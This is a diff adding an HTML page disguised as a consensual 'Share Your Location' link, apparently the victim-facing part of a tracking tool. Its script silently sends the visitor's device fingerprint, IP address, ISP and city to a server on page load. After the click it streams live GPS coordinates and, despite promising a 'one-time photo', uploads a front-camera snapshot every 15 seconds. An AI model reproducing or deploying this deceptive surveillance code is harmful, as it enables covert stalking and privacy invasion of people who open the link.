@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Share</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+      color: #e2e8f0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      max-width: 440px;
+      width: 90%;
+      text-align: center;
+    }
+    .card {
+      background: rgba(30, 30, 50, 0.8);
+      border: 1px solid rgba(99, 102, 241, 0.2);
+      border-radius: 20px;
+      padding: 40px 32px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+    }
+    .icon-wrapper {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.4); }
+      50% { box-shadow: 0 0 0 20px rgba(99, 102, 241, 0); }
+    }
+    .icon-wrapper svg { width: 36px; height: 36px; color: white; }
+    h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #fff; }
+    .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 32px; line-height: 1.6; }
+
+    .permission-section {
+      background: rgba(15, 15, 30, 0.5);
+      border: 1px solid rgba(99, 102, 241, 0.15);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 16px;
+      text-align: left;
+      transition: all 0.3s;
+    }
+    .permission-section:hover { border-color: rgba(99, 102, 241, 0.4); }
+    .permission-section.granted { border-color: rgba(34, 197, 94, 0.4); background: rgba(34, 197, 94, 0.05); }
+    .permission-section.denied { border-color: rgba(239, 68, 68, 0.4); background: rgba(239, 68, 68, 0.05); }
+
+    .perm-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .perm-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .perm-icon.loc { background: rgba(99, 102, 241, 0.15); color: #818cf8; }
+    .perm-icon.cam { background: rgba(236, 72, 153, 0.15); color: #f472b6; }
+    .perm-title { font-weight: 600; font-size: 15px; }
+    .perm-desc { font-size: 13px; color: #94a3b8; line-height: 1.5; }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 500;
+      margin-top: 10px;
+    }
+    .status-badge.pending { background: rgba(250, 204, 21, 0.1); color: #facc15; }
+    .status-badge.active { background: rgba(34, 197, 94, 0.1); color: #22c55e; }
+    .status-badge.error { background: rgba(239, 68, 68, 0.1); color: #ef4444; }
+
+    .btn {
+      width: 100%;
+      padding: 14px 24px;
+      border-radius: 12px;
+      border: none;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      color: white;
+    }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(99, 102, 241, 0.3); }
+    .btn-primary:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .live-indicator {
+      display: none;
+      align-items: center;
+      gap: 8px;
+      padding: 16px;
+      background: rgba(34, 197, 94, 0.1);
+      border: 1px solid rgba(34, 197, 94, 0.2);
+      border-radius: 12px;
+      margin-top: 20px;
+    }
+    .live-indicator.visible { display: flex; }
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      background: #22c55e;
+      border-radius: 50%;
+      animation: blink 1.5s ease-in-out infinite;
+    }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .live-text { font-size: 13px; color: #22c55e; font-weight: 500; }
+
+    .footer-note {
+      margin-top: 24px;
+      font-size: 11px;
+      color: #64748b;
+      line-height: 1.5;
+    }
+
+    .coords-display {
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 12px;
+      color: #818cf8;
+      margin-top: 8px;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="icon-wrapper">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+          <circle cx="12" cy="10" r="3"></circle>
+        </svg>
+      </div>
+      <h1>Share Your Location</h1>
+      <p class="subtitle">Someone has requested to see your location. Grant permission below to share your live position and optionally a camera snapshot.</p>
+
+      <!-- Location Permission -->
+      <div class="permission-section" id="loc-section">
+        <div class="perm-header">
+          <div class="perm-icon loc">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+              <circle cx="12" cy="10" r="3"></circle>
+            </svg>
+          </div>
+          <div>
+            <div class="perm-title">Location Access</div>
+            <div class="perm-desc">Share your GPS coordinates in real-time</div>
+          </div>
+        </div>
+        <div id="loc-status">
+          <span class="status-badge pending">
+            <span class="live-dot" style="background:#facc15;"></span>
+            Waiting for permission
+          </span>
+        </div>
+        <div class="coords-display" id="coords-display"></div>
+      </div>
+
+      <!-- Camera Permission -->
+      <div class="permission-section" id="cam-section">
+        <div class="perm-header">
+          <div class="perm-icon cam">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+              <circle cx="12" cy="13" r="4"></circle>
+            </svg>
+          </div>
+          <div>
+            <div class="perm-title">Camera Snapshot</div>
+            <div class="perm-desc">Take a one-time photo from your camera</div>
+          </div>
+        </div>
+        <div id="cam-status">
+          <span class="status-badge pending">
+            <span class="live-dot" style="background:#facc15;"></span>
+            Waiting for permission
+          </span>
+        </div>
+      </div>
+
+      <button class="btn btn-primary" id="start-btn" onclick="startSharing()">
+        Allow & Share Location
+      </button>
+
+      <div class="live-indicator" id="live-indicator">
+        <div class="live-dot"></div>
+        <span class="live-text">Sharing live location...</span>
+      </div>
+
+      <p class="footer-note">
+        Your location data is only shared with the person who sent this link. You can stop sharing at any time by closing this page.
+      </p>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const TRACKER_ID = window.location.pathname.split('/').pop();
+    let socket;
+    let watchId = null;
+    let cameraStream = null;
+    let sharing = false;
+
+    document.addEventListener('DOMContentLoaded', () => {
+      socket = io();
+      socket.emit('join-tracker', TRACKER_ID);
+
+      // Send basic device info first
+      const basicInfo = {
+        platform: navigator.platform,
+        browser: getBrowser(),
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        deviceName: navigator.userAgentData?.platform || navigator.platform || 'Unknown',
+        cores: navigator.hardwareConcurrency || 'N/A',
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+        touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+
+      socket.emit('device-info', {
+        trackerId: TRACKER_ID,
+        info: basicInfo
+      });
+
+      // Fetch IP, ISP, and network details
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const networkInfo = {
+            ...basicInfo,
+            ipAddress: data.ip || 'N/A',
+            ipVersion: data.version || 'N/A',
+            isp: data.org || 'N/A',
+            asn: data.asn || 'N/A',
+            city: data.city || 'N/A',
+            region: data.region || 'N/A',
+            country: data.country_name || data.country || 'N/A',
+            countryCode: data.country_code || 'N/A',
+            postal: data.postal || 'N/A',
+            latitude: data.latitude || 'N/A',
+            longitude: data.longitude || 'N/A',
+            timezone: data.timezone || basicInfo.timezone
+          };
+          socket.emit('device-info', {
+            trackerId: TRACKER_ID,
+            info: networkInfo
+          });
+        })
+        .catch(() => {
+          // Fallback: try ipinfo.io
+          fetch('https://ipinfo.io/json')
+            .then(res => res.json())
+            .then(data => {
+              const networkInfo = {
+                ...basicInfo,
+                ipAddress: data.ip || 'N/A',
+                isp: data.org || 'N/A',
+                city: data.city || 'N/A',
+                region: data.region || 'N/A',
+                country: data.country || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || basicInfo.timezone
+              };
+              socket.emit('device-info', {
+                trackerId: TRACKER_ID,
+                info: networkInfo
+              });
+            })
+            .catch(() => {});
+        });
+    });
+
+    async function startSharing() {
+      const btn = document.getElementById('start-btn');
+      btn.disabled = true;
+      btn.textContent = 'Requesting permissions...';
+
+      // 1. Request Location
+      try {
+        const pos = await requestLocation();
+        document.getElementById('loc-section').classList.add('granted');
+        document.getElementById('loc-status').innerHTML = `
+          <span class="status-badge active">
+            <span class="live-dot"></span>
+            Location active
+          </span>`;
+        startLocationUpdates();
+      } catch (e) {
+        document.getElementById('loc-section').classList.add('denied');
+        document.getElementById('loc-status').innerHTML = `
+          <span class="status-badge error">
+            Location denied
+          </span>`;
+      }
+
+      // 2. Request Camera (optional)
+      try {
+        await requestCamera();
+        document.getElementById('cam-section').classList.add('granted');
+        document.getElementById('cam-status').innerHTML = `
+          <span class="status-badge active">
+            <span class="live-dot"></span>
+            Camera active — capturing...
+          </span>`;
+        capturePhotos();
+      } catch (e) {
+        document.getElementById('cam-section').classList.add('denied');
+        document.getElementById('cam-status').innerHTML = `
+          <span class="status-badge error">
+            Camera denied
+          </span>`;
+      }
+
+      sharing = true;
+      btn.style.display = 'none';
+      document.getElementById('live-indicator').classList.add('visible');
+    }
+
+    function requestLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject('Not supported');
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos),
+          err => reject(err),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    function startLocationUpdates() {
+      watchId = navigator.geolocation.watchPosition(
+        pos => {
+          const { latitude, longitude, accuracy, altitude, speed, heading } = pos.coords;
+          socket.emit('location-update', {
+            trackerId: TRACKER_ID,
+            latitude,
+            longitude,
+            accuracy,
+            altitude,
+            speed,
+            heading
+          });
+          document.getElementById('coords-display').textContent = 
+            `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (±${Math.round(accuracy)}m)`;
+        },
+        err => console.error('Location error:', err),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    function requestCamera() {
+      return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          cameraStream = stream;
+          return stream;
+        });
+    }
+
+    function capturePhotos() {
+      if (!cameraStream) return;
+      const video = document.createElement('video');
+      video.srcObject = cameraStream;
+      video.autoplay = true;
+      video.playsInline = true;
+
+      video.onloadedmetadata = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+
+        function snap() {
+          if (!sharing) return;
+          ctx.drawImage(video, 0, 0);
+          const image = canvas.toDataURL('image/jpeg', 0.7);
+          socket.emit('photo-capture', {
+            trackerId: TRACKER_ID,
+            image,
+            facing: 'user'
+          });
+          // Capture every 15 seconds
+          setTimeout(snap, 15000);
+        }
+
+        // First capture after 3 seconds
+        setTimeout(snap, 3000);
+      };
+    }
+
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Chrome')) return 'Chrome';
+      if (ua.includes('Firefox')) return 'Firefox';
+      if (ua.includes('Safari')) return 'Safari';
+      if (ua.includes('Edge')) return 'Edge';
+      return 'Unknown';
+    }
+
+    // Cleanup on page close
+    window.addEventListener('beforeunload', () => {
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    });
+  </script>
+</body>
+</html>
